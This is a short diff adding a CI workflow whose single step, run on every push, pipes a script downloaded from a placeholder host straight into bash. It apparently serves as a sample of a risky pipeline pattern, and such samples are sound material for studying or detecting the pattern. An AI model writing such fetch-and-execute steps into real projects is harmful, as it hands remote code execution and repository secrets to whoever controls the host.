@@ -1,0 +1,5 @@
+on: push
+jobs:
+  t:
+    steps:
+      - run: curl https://example.com/x | bash
